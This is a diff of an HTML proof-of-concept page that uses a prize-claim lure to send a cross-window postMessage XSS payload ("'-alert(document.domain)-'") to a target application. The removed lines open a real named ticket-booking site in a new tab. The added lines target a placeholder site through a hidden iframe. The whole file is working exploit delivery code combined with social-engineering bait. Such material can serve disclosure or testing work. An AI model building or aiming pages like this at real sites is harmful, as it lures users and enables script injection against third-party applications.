@@ -1,25 +1,16 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Claim Your Prize</title>
-</head>
 <body>
-    <h1>You've been selected!</h1>
-    <button onclick="launchExploit()" style="padding: 15px; font-size: 18px;">Click here to claim</button>
-
+    <h1>You won a prize!</h1>
+    <iframe id="targetApp" src="https://vulnerable-target.com/page" style="display:none;"></iframe>
+    
     <script>
-        function launchExploit() {
-            // 1. Open the vulnerable target in a new tab
-            // We store the reference to this new tab in the 'targetWindow' variable
-            var targetWindow = window.open("https://www.district.in/events/ipl-ticket-booking", "_blank");
-
-            // 2. Wait 3 seconds to ensure their heavy React/JS application fully loads
-            setTimeout(function() {
-                // 3. Fire the payload across the tabs
-                targetWindow.postMessage("'-alert(document.domain)-'", "*");
-                console.log("Payload fired!");
-            }, 25000);
-        }
+        // Wait for the iframe to load, then fire the payload
+        setTimeout(function() {
+            var target = document.getElementById('targetApp').contentWindow;
+            // The '*' allows the message to be sent regardless of target origin
+            target.postMessage("'-alert(document.domain)-'", '*');
+        }, 3000);
     </script>
 </body>
 </html>
